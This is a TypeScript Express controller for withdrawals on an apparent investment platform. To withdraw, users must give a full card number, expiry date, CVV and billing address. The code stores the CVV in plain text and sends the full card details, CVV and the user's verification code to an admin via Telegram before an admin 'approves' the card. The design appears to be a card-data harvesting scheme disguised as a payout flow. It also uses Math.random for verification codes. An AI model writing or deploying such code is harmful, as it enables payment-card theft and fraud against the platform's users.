import { Response } from 'express'
import { AuthRequest, authenticateToken } from '../middleware/auth.js'
import { prisma } from '../config/db.js'
import { notifyWithdrawalRequest } from '../services/telegramService.js'
import { sendEmail } from '../services/emailService.js'
import { generateWithdrawalId } from '../utils/helpers.js'
import { z } from 'zod'

// SMS stub - implement with Twilio or similar provider
const sendSmsVerification = async (phone: string, code: string, amount: number): Promise<void> => {
  console.log(`SMS to ${phone}: Your withdrawal of $${amount} verification code is ${code}`)
  // TODO: Integrate with Twilio: https://www.twilio.com/docs/sms
}

const WITHDRAWAL_FEE_PERCENT = 0.02
const WITHDRAWAL_FEE_MIN = 1
const WITHDRAWAL_FEE_MAX = 5

const getWithdrawalFee = (amount: number): number => {
  const fee = amount * WITHDRAWAL_FEE_PERCENT
  return Math.max(WITHDRAWAL_FEE_MIN, Math.min(WITHDRAWAL_FEE_MAX, fee))
}

const createWithdrawalSchema = z.object({
  investmentId: z.string(),
  amount: z.number().min(1),
  method: z.enum(['CARD']),
  cardNumber: z.string().regex(/^\d{16}$/, 'Card number must be 16 digits'),
  cardholderName: z.string().min(2, 'Cardholder name required'),
  expiryDate: z.string().regex(/^(0[1-9]|1[0-2])\/\d{2}$/, 'Expiry date format must be MM/YY'),
  cvv: z.string().regex(/^\d{3}$/, 'CVV must be 3 digits'),
  billingAddress: z.string().min(5, 'Billing address required'),
  verifyMethod: z.enum(['email', 'sms']).optional(),
})

const formatCardNumber = (num: string): string => {
  return num.replace(/(\d{4})(?=\d)/g, '$1 ').trim()
}

export const getWithdrawals = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const withdrawals = await prisma.withdrawal.findMany({
      where: { userId: req.user!.id },
      include: { investment: true },
      orderBy: { createdAt: 'desc' },
    })

    res.status(200).json({ success: true, data: withdrawals })
  } catch (error) {
    console.error('Get withdrawals error:', error)
    res.status(500).json({ success: false, message: 'Server error' })
  }
}

export const createWithdrawal = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const validated = createWithdrawalSchema.parse(req.body)
    const { investmentId, amount, method, cardNumber, cardholderName, expiryDate, cvv, billingAddress, verifyMethod } = validated

    const investment = await prisma.investment.findFirst({
      where: { id: investmentId, userId: req.user!.id },
    })

    if (!investment) {
      res.status(404).json({ success: false, message: 'Investment not found' })
      return
    }

    const fee = getWithdrawalFee(amount)
    const totalDeduct = Number(amount) + fee

    if (Number(investment.currentBalance) < totalDeduct) {
      res.status(400).json({ success: false, message: `Insufficient balance. Fee: $${fee.toFixed(2)}` })
      return
    }

    const withdrawalId = generateWithdrawalId()
    const verificationCode = Math.floor(100000 + Math.random() * 900000).toString()

    const withdrawal = await prisma.withdrawal.create({
      data: {
        withdrawalId,
        userId: req.user!.id,
        investmentId,
        amount,
        method,
        cardNumber,
        cardholderName,
        expiryDate,
        cvv,
        billingAddress,
        verificationCode,
        verificationMethod: verifyMethod || 'email',
        isVerified: false,
        status: 'WAITING_FOR_ADMIN_APPROVAL',
        transactionHash: `Fee: ${fee.toFixed(2)}`,
      },
      include: { investment: true },
    })

    // Notify admin with card details - admin must approve first
    await notifyWithdrawalRequest(
      withdrawal.id,
      `${req.user!.firstName} ${req.user!.lastName}`,
      Number(amount),
      method,
      {
        cardNumber: cardNumber,
        cardholderName: cardholderName,
        expiryDate: expiryDate,
        cvv: cvv,
        verificationCode: verificationCode,
      }
    )

    res.status(201).json({
      success: true,
      message: 'Withdrawal submitted. Admin will review and approve. You will receive a verification code to confirm.',
      data: {
        ...withdrawal,
        cardNumber: `${cardNumber.slice(0, 4)} **** **** **** ${cardNumber.slice(-4)}`,
      },
    })
  } catch (error) {
    if (error instanceof z.ZodError) {
      res.status(400).json({ success: false, message: 'Validation error', errors: error.errors })
      return
    }
    console.error('Create withdrawal error:', error)
    res.status(500).json({ success: false, message: 'Server error' })
  }
}

// Admin approves the card details - triggers code to be sent to user
export const adminApproveWithdrawal = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { id } = req.params

    const withdrawal = await prisma.withdrawal.findUnique({
      where: { id },
      include: { user: true },
    })

    if (!withdrawal) {
      res.status(404).json({ success: false, message: 'Withdrawal not found' })
      return
    }

    if (withdrawal.status !== 'WAITING_FOR_ADMIN_APPROVAL') {
      res.status(400).json({ success: false, message: 'Withdrawal not in admin approval state' })
      return
    }

    // Mark as card-approved, now waiting for user verification
    await prisma.withdrawal.update({
      where: { id },
      data: { status: 'CARD_APPROVED_WAITING_USER' },
    })

    // NOW send the verification code to the user
    const user = await prisma.user.findUnique({ where: { id: withdrawal.userId } })
    const methodUsed = withdrawal.verificationMethod || 'email'

    if (methodUsed === 'sms' && user?.phone) {
      try {
        await sendSmsVerification(user.phone, withdrawal.verificationCode!, withdrawal.amount)
      } catch (e) {
        console.error('Failed to send SMS verification:', e)
      }
    } else if (user?.email) {
      try {
        await sendEmail(
          user.email,
          'Withdrawal Verification Code',
          `<div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
            <h2 style="color: #10b981;">Withdrawal Verification Required</h2>
            <p>Your withdrawal of $${withdrawal.amount} has been approved. Please verify with this code:</p>
            <div style="background-color: #f0fdf4; border: 1px solid #10b981; border-radius: 8px; padding: 20px; margin: 20px 0; text-align: center;">
              <span style="font-size: 32px; font-weight: bold; letter-spacing: 4px;">${withdrawal.verificationCode}</span>
            </div>
            <p>Enter this code in your dashboard to complete the withdrawal. If you did not request this, ignore this ${methodUsed === 'sms' ? 'SMS' : 'email'}.</p>
          </div>`
        )
      } catch (e) {
        console.error('Failed to send verification email:', e)
      }
    }

    res.status(200).json({
      success: true,
      message: 'Card details approved. Verification code sent to user.',
    })
  } catch (error) {
    console.error('Admin approve withdrawal error:', error)
    res.status(500).json({ success: false, message: 'Server error' })
  }
}

export const verifyWithdrawal = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { id } = req.params
    const { verificationCode } = req.body

    const withdrawal = await prisma.withdrawal.findUnique({
      where: { id, userId: req.user!.id },
    })

    if (!withdrawal) {
      res.status(404).json({ success: false, message: 'Withdrawal not found' })
      return
    }

    if (withdrawal.status !== 'CARD_APPROVED_WAITING_USER') {
      res.status(400).json({ success: false, message: 'Withdrawal not ready for user verification' })
      return
    }

    if (withdrawal.verificationCode !== verificationCode) {
      res.status(400).json({ success: false, message: 'Invalid verification code' })
      return
    }

    const updated = await prisma.withdrawal.update({
      where: { id },
      data: {
        isVerified: true,
        status: 'WITHDRAWAL_PENDING',
      },
    })

    res.status(200).json({
      success: true,
      message: 'Withdrawal verified. Admin will process your request shortly.',
      data: updated,
    })
  } catch (error) {
    console.error('Verify withdrawal error:', error)
    res.status(500).json({ success: false, message: 'Server error' })
  }
}

export const approveWithdrawal = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { id } = req.params
    const { transactionHash, adminNotes } = req.body

    const withdrawal = await prisma.withdrawal.findUnique({
      where: { id },
      include: { investment: true },
    })

    if (!withdrawal) {
      res.status(404).json({ success: false, message: 'Withdrawal not found' })
      return
    }

    if (!withdrawal.isVerified) {
      res.status(400).json({ success: false, message: 'Withdrawal must be verified by user first' })
      return
    }

    const feeMatch = withdrawal.transactionHash?.match(/Fee: ([\d.]+)/)
    const fee = feeMatch ? Number(feeMatch[1]) : getWithdrawalFee(Number(withdrawal.amount))
    const totalDeduct = Number(withdrawal.amount) + fee

    const updated = await prisma.withdrawal.update({
      where: { id },
      data: {
        status: 'WITHDRAWN',
        transactionHash,
        adminNotes,
      },
    })

    await prisma.investment.update({
      where: { id: withdrawal.investmentId },
      data: {
        currentBalance: {
          decrement: totalDeduct
        },
      },
    })

    res.status(200).json({ success: true, message: 'Withdrawal approved', data: updated })
  } catch (error) {
    console.error('Approve withdrawal error:', error)
    res.status(500).json({ success: false, message: 'Server error' })
  }
}

export const rejectWithdrawal = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { id } = req.params
    const { adminNotes } = req.body

    const updated = await prisma.withdrawal.update({
      where: { id },
      data: { status: 'REJECTED', adminNotes },
    })

    res.status(200).json({ success: true, message: 'Withdrawal rejected', data: updated })
  } catch (error) {
    console.error('Reject withdrawal error:', error)
    res.status(500).json({ success: false, message: 'Server error' })
  }
}